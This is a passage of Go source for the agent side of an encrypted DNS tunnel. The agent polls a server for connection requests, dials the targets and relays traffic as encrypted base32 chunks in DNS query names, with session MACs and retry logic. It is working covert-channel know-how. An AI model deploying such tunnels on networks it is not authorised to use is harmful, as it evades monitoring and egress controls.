// chars of overhead that the worst-case reserves but rarely uses,
// translating to +5-15 plaintext bytes per chunk.
//
// The tcp flag adds 6 chars (label + dot) when present.
//
// Returns the math-computed budget without clamping; a domain long enough to
// drive the result toward zero or negative makes axchg infeasible at this
// transport, and handleTunnel refuses to start in that case. Silently
// returning a fallback budget here would yield queries that exceed 253 chars
// and the server would FORMERR every round-trip.
func maxAxchgWritePlaintextBytes(domain string, tcp bool, seqWidth, nonceWidth int) int {
	const (
		dnsNameMax = 253
		cidLabel   = 16
		smacLabel  = 7 // 4-byte MAC encoded as 7 base32 chars (NoPadding)
		cmdLabel   = 5 // "axchg"
		// a- + up to eight hex digits for the highest-contiguous read ACK.
		// Budget it even at startup so a long-lived tunnel never crosses the
		// DNS 253-byte limit merely because its ACK counter grew.
		ackLabelMax = 10
		// dotsMargin reserves chars for the dots between labels.
		// Actual count: 2 (cid,seq) + dataLabels + (1 if tcp) + 3
		// (nonce, smac, axchg) + 1 (domain) − 1 = 5+dataLabels (UDP)
		// or 6+dataLabels (TCP). With expanded budgets we top out at
		// ~4 data labels → 9 dots UDP, 10 TCP. Margin 12 keeps safety.
		dotsMargin = 12
	)
	overhead := cidLabel + seqWidth + nonceWidth + ackLabelMax + smacLabel + cmdLabel + len(domain) + dotsMargin
	if tcp {
		overhead += len(gproxy.AxchgTCPMarker) + 1
	}
	available := dnsNameMax - overhead
	raw := (available * 5) / 8
	raw -= 16
	return raw
}

// hexWidth returns the number of hex digits needed to represent n (with
// n=0 counted as 1 digit). Used by the reader to predict the worst-case
// width of the next seq/nonce before computing the chunk budget. Hex is
// chosen over decimal because uint64 fits in 16 hex chars vs 20 decimal
// — that 8-char savings translates to ~5 bytes more plaintext per chunk
// at worst-case widths.
// nonceGuardExceeded returns true when the per-tunnel counters are close
// enough to overflowing the 32-bit budget assumption that we should tear
// the tunnel down rather than emit queries that overflow the 253-char
// QNAME limit. At 100K q/s × 96 workers this triggers after ~12 hours of
// continuous bulk on a single cid — well beyond realistic SOCKS5 session
// lengths but possible for long-running pipes.
//
// Exposed as a package-level helper so the exhaustion path can be
// exercised in unit tests without spinning up a full tunnel.
func nonceGuardExceeded(seq, currentNonce uint64, workers int) bool {
	return seq+1 > 0xFFFFFFFF || currentNonce+uint64(workers) > 0xFFFFFFFF
}

func hexWidth(n uint64) int {
	if n == 0 {
		return 1
	}
	w := 0
	for n > 0 {
		w++
		n >>= 4
	}
	return w
}

func isTimeout(err error) bool {
	var ne net.Error
	if errors.As(err, &ne) {
		return ne.Timeout()
	}
	return false
}

// --- DNS RPC wrappers ------------------------------------------------------

// b32 is the lowercase-alphabet base32 used to encode axchg ciphertext
// into DNS labels. Encoder outputs are already lowercase (no strings.ToLower
// copy needed); the matching decoder is dnshelpers.B32DecodeAny which
// accepts either case in case a resolver upper-cases labels in transit.
var b32 = dnshelpers.B32LowerNoPad

// agentPoll asks the server "any pending opens?". Returns (cid, target,
// nil) on a hit, ("", "", nil) on EMPTY, or an error.
func agentPoll(cfg config, resolver *txtResolver) (cid, target, pollID string, err error) {
	cid, target, pollID, _, err = agentPollVersioned(cfg, resolver)
	return cid, target, pollID, err
}

func agentPollVersioned(cfg config, resolver *txtResolver) (cid, target, pollID string, v2 bool, err error) {
	pollID, err = protocol.NewSID()
	if err != nil {
		return "", "", "", false, err
	}
	mode := cfg.protocolMode
	if mode == nil {
		mode = &atomic.Int32{}
	}
	args := []string{pollID, "v2"}
	if mode.Load() == agentProtocolLegacy {
		args = args[:1]
	}
	resp, err := resolver.queryNames(authenticatedNames(cfg, "apoll", args))
	if err != nil {
		return "", "", "", false, err
	}
	if len(args) == 2 && resp == "ERR malformed" {
		if mode.CompareAndSwap(agentProtocolUnknown, agentProtocolLegacy) {
			fmt.Fprintln(os.Stderr, "warning: server does not support proxy protocol v2; using legacy aopen semantics")
		}
		resp, err = resolver.queryNames(authenticatedNames(cfg, "apoll", args[:1]))
		if err != nil {
			return "", "", "", false, err
		}
	} else if len(args) == 2 {
		mode.CompareAndSwap(agentProtocolUnknown, agentProtocolV2)
	}
	v2 = mode.Load() == agentProtocolV2
	if resp == "EMPTY" {
		return "", "", "", v2, nil
	}
	if strings.HasPrefix(resp, "ERR ") {
		return "", "", "", v2, errors.New(resp)
	}
	if !strings.HasPrefix(resp, "OPEN ") {
		return "", "", "", v2, fmt.Errorf("unexpected apoll response: %q", resp)
	}
	parts := strings.SplitN(resp[len("OPEN "):], " ", 2)
	if len(parts) != 2 {
		return "", "", "", v2, fmt.Errorf("malformed OPEN response: %q", resp)
	}
	cid = parts[0]
	if !gproxy.ValidCID(cid) {
		return "", "", "", v2, fmt.Errorf("bad cid in OPEN: %q", cid)
	}
	// Target is base32-encoded by the server; older servers send uppercase,
	// newer ones lowercase. dnshelpers.B32DecodeAny handles both without
	// paying a strings.ToUpper allocation on the common (lowercase) path.
	rawTarget, err := dnshelpers.B32DecodeAny(parts[1])
	if err != nil {
		return "", "", "", v2, fmt.Errorf("decode target: %w", err)
	}
	return cid, string(rawTarget), pollID, v2, nil
}

// exchangeResult captures what one axchg DNS round-trip yielded: the write
// side returned ACK <writeSeq>, and the read side returned either a chunk,
// EMPTY, or CLOSED. Pure-read axchgs leave writeSeq=0.
type exchangeResult struct {
	ackedWriteSeq uint64
	readData      []byte
	readSeq       uint64
	readClosed    bool
	readEmpty     bool
}

// agentExchange runs a single axchg DNS round-trip combining one awrite
// chunk (or none) with a fresh aread pull. Returns the parsed exchangeResult
// or an error; the caller decides what to retry.
//
// Wire: cid . writeSeq . [writeChunks...] . [x-tcp] . readNonce . smac . axchg . <shard>
// shardAuthDomain picks which configured shard suffix ends the QNAME.
// HMAC/session MAC don't touch shardAuthDomain — they use ts.sessionKey
// derived from canonical (cfg.domain), so any shard is auth-equivalent.
func agentExchange(cfg config, resolver *txtResolver, ts *tunnelSession, cid string, writeSeq uint64, writeData []byte, shardAuthDomain string) (exchangeResult, error) {
	readNonce := ts.nextNonce()
	args := make([]string, 0, 8)
	args = append(args, cid, strconv.FormatUint(writeSeq, 16))
	if writeSeq > 0 {
		compressed := ts.compressor.Encode(writeData)
		// Seal into a pooled dst buffer so aead.Seal doesn't allocate a
		// fresh ciphertext slice per chunk. `enc` is a fresh string that
		// copies bytes out of the pooled scratch, so we can release
		// immediately after EncodeToString returns. Use a closure so a
		// hypothetical panic in Seal/Encode still returns the buffer.
		ctBufPtr := gproxy.GetBuf(len(compressed) + 16)
		var enc string
		func() {
			defer gproxy.PutBuf(ctBufPtr)
			ct := gproxy.SealChunkTo((*ctBufPtr)[:0], ts.aead, gproxy.DirClientToServer, writeSeq, compressed)
			enc = b32.EncodeToString(ct) // already lowercase — see b32 var doc
		}()
		args = append(args, codec.ChunkString(enc, 63)...)
	}
	if cfg.tcp {
		args = append(args, gproxy.AxchgTCPMarker)
	}
	args = append(args, "a-"+strconv.FormatUint(ts.readAck.Load(), 16))
	args = append(args, strconv.FormatUint(readNonce, 16))
	args = append(args, protocol.SessionMAC(ts.sessionKey, "axchg", readNonce))
	// shardAuthDomain is pre-normalized by parseDomainCSV and "axchg"
	// is already lowercase — skip protocol.AuthDomain + strings.ToLower
	// per query. The shard varies per call (RR from workers/rotor);
	// HMAC/session MAC live in args and are unaffected by suffix choice.
	// A response timeout is ambiguous: the server may already have drained
	// a stream chunk. Retry the exact same nonce and QNAME so its response
	// cache returns byte-identical segments. Never mint a fresh nonce here.
	retries := cfg.retries
	if retries < 1 {
		retries = 1
	}
	var (
		segs []string
		err  error
	)
	for attempt := 0; attempt < retries; attempt++ {
		retryShard := cfg.retryShardAuthDomain(shardAuthDomain, attempt)
		name := protocol.JoinNameFast(retryShard, "axchg", args)
		segs, err = resolver.queryStringsNoRetry(name)
		if err == nil {
			break
		}
		if attempt+1 < retries {
			time.Sleep(time.Duration(attempt+1) * retryBackoff)
		}
	}
	if err != nil {
		return exchangeResult{}, err
	}
	if len(segs) == 0 {
		return exchangeResult{}, errors.New("empty axchg response")
	}

	// First segment is "ACK <writeSeq>" or "ERR ..." / "CLOSED".
	head := segs[0]
	switch {
	case head == "CLOSED":
		return exchangeResult{readClosed: true}, nil
	case head == "ERR seq":
		return exchangeResult{}, errServerSeq
	case strings.HasPrefix(head, "ERR "):
		return exchangeResult{}, errors.New(head)
	case strings.HasPrefix(head, "ACK "):
		acked, perr := strconv.ParseUint(strings.TrimPrefix(head, "ACK "), 16, 64)
		if perr != nil {
			return exchangeResult{}, fmt.Errorf("malformed ACK: %w", perr)
		}
		if acked != writeSeq {
			return exchangeResult{}, fmt.Errorf("axchg ACK mismatch: got %x want %x", acked, writeSeq)
		}

		res := exchangeResult{ackedWriteSeq: acked}
		if len(segs) < 2 {
			res.readEmpty = true
			return res, nil
		}
		readHead := segs[1]
		switch {
		case readHead == "EMPTY":
			res.readEmpty = true
			return res, nil
		case readHead == "CLOSED":
			res.readClosed = true
			return res, nil
		case strings.HasPrefix(readHead, "DATA "):
			parsedSeq, perr := strconv.ParseUint(strings.TrimPrefix(readHead, "DATA "), 16, 64)
			if perr != nil {
				return exchangeResult{}, fmt.Errorf("malformed DATA seq: %w", perr)
			}
			b64 := strings.Join(segs[2:], "")
			ct, derr := base64.StdEncoding.DecodeString(b64)
			if derr != nil {
				return exchangeResult{}, fmt.Errorf("decode axchg payload: %w", derr)
			}
			// Open into a pooled dst buffer; compressor.Decode below returns
			// a fresh slice so `decompressed` doesn't reference the pool
			// buffer after Decode returns. defer ensures the buffer is
			// released on every return path (error, panic, or success)
			// with no chance of a double-put.
			ptBufPtr := gproxy.GetBuf(len(ct))
			defer gproxy.PutBuf(ptBufPtr)
			pt, oerr := gproxy.OpenChunkTo((*ptBufPtr)[:0], ts.aead, gproxy.DirServerToClient, parsedSeq, ct)
			if oerr != nil {
				return exchangeResult{}, fmt.Errorf("decrypt axchg payload: %w", oerr)
			}
			decompressed, derr := ts.compressor.Decode(pt)
			if derr != nil {
				return exchangeResult{}, fmt.Errorf("decompress axchg payload: %w", derr)
			}
			res.readData = decompressed
			res.readSeq = parsedSeq
			return res, nil
		default:
			return exchangeResult{}, fmt.Errorf("unexpected axchg read head: %q", readHead)
		}
	default:
		return exchangeResult{}, fmt.Errorf("unexpected axchg head: %q", head)
	}
}

// agentOpen confirms a modern apoll lease after the local target dial.  The
// request is naturally idempotent: retries carry the same cid/poll ID/status.
func agentOpen(cfg config, resolver *txtResolver, cid, pollID, status string) error {
	return agentOpenUntil(cfg, resolver, cid, pollID, status, time.Time{})
}

func agentOpenUntil(cfg config, resolver *txtResolver, cid, pollID, status string, deadline time.Time) error {
	if pollID == "" {
		return nil
	}
	resp, err := resolver.queryNamesUntil(authenticatedNames(cfg, "aopen", []string{cid, pollID, status}), deadline)
	if err != nil {
		return err
	}
	if resp != "OK" {
		return fmt.Errorf("unexpected aopen response: %q", resp)
	}
	return nil
}

func agentStatus(cfg config, resolver *txtResolver, cid, pollID string) (string, error) {
	return agentStatusUntil(cfg, resolver, cid, pollID, time.Time{})
}

func agentStatusUntil(cfg config, resolver *txtResolver, cid, pollID string, deadline time.Time) (string, error) {
	resp, err := resolver.queryNamesUntil(authenticatedNames(cfg, "astatus", []string{cid, pollID}), deadline)
	if err != nil {
		return "", err
	}
	switch resp {
	case "PENDING", "OPEN", "CLOSED":
		return resp, nil
	default:
		return "", fmt.Errorf("unexpected astatus response: %q", resp)
	}
}

// confirmAgentOpen keeps an already-dialled target alive while resolving an
// ambiguous aopen response. Repeating the same cid/pollID/status is
// idempotent; only an explicit OPEN allows tunnel traffic to start.
func confirmAgentOpen(cfg config, resolver *txtResolver, cid, pollID, status string, v2 bool) error {
	if !v2 {
		return agentOpen(cfg, resolver, cid, pollID, status)
	}
	return confirmAgentOpenUntil(cfg, resolver, cid, pollID, status, time.Now().Add(15*time.Second))
}

func confirmAgentOpenUntil(cfg config, resolver *txtResolver, cid, pollID, status string, deadline time.Time) error {
	var lastErr error
	for {
		if err := agentOpenUntil(cfg, resolver, cid, pollID, status, deadline); err == nil {
			return nil
		} else {
			lastErr = err
		}
		state, err := agentStatusUntil(cfg, resolver, cid, pollID, deadline)
		if err == nil {
			switch state {
			case "OPEN":
				if status == "ok" {
					return nil
				}
				return fmt.Errorf("aopen status mismatch: server reports OPEN after %s", status)
			case "CLOSED":
				if status != "ok" {
					return nil
				}
				return fmt.Errorf("aopen closed before confirmation: %w", lastErr)
			}
		} else {
			lastErr = err
		}
		if !time.Now().Before(deadline) {
			return fmt.Errorf("aopen confirmation deadline: %w", lastErr)
		}
		delay := retryBackoff
		if remaining := time.Until(deadline); delay > remaining {
			delay = remaining
		}
		if delay > 0 {
			time.Sleep(delay)
		}
	}
}

// agentClose tells the server we're done with cid. The MAC binds the nonce
// so a replay can't free new state; the server treats unknown-cid as a
// successful no-op so retries on DNS timeout are safe.
//
// Wire: cid . nonce . smac . aclose . <shard>
// Shard suffix is picked round-robin from cfg.shardRotor (aclose isn't
// worker-local so there's no per-worker cursor). Session MAC lives in
// args and is unaffected by suffix choice.
func agentClose(cfg config, resolver *txtResolver, ts *tunnelSession, cid string) error {
	nonce := ts.nextNonce()
	args := []string{
		cid,
		strconv.FormatUint(nonce, 16),
		protocol.SessionMAC(ts.sessionKey, "aclose", nonce),
	}
	domains := cfg.retryShardAuthDomains()
	names := make([]string, len(domains))
	for i, domain := range domains {
		names[i] = protocol.JoinNameFast(domain, "aclose", args)
	}
	_, err := resolver.queryNames(names)
	return err
}

// --- Authenticated name builder (used only by apoll, which has no cid yet) -

// authenticatedName builds an apoll-style QNAME. canonicalDomain drives
// the HMAC (the server verifies against its canonical -domain too), and
// shardAuthDomain picks which shard suffix ends the QNAME. For single-
// domain configs the two are equivalent. `command` must already be
// lowercase — JoinNameFast's contract.
func authenticatedName(secret, canonicalDomain, shardAuthDomain, command string, args []string) string {
	ts := protocol.CurrentTimestamp(time.Now())
	token := protocol.AuthToken(secret, canonicalDomain, command, ts, args)
	labels := make([]string, 0, len(args)+3)
	labels = append(labels, args...)
	labels = append(labels, ts, token)
	return protocol.JoinNameFast(shardAuthDomain, command, labels)
}

func authenticatedNames(cfg config, command string, args []string) []string {
	timestamp := protocol.CurrentTimestamp(time.Now())
	token := protocol.AuthToken(cfg.pass, cfg.domain, command, timestamp, args)
	labels := make([]string, 0, len(args)+2)
	labels = append(labels, args...)
	labels = append(labels, timestamp, token)
	domains := cfg.retryShardAuthDomains()
	names := make([]string, len(domains))
	for i, domain := range domains {
		names[i] = protocol.JoinNameFast(domain, command, labels)
	}
	return names
}
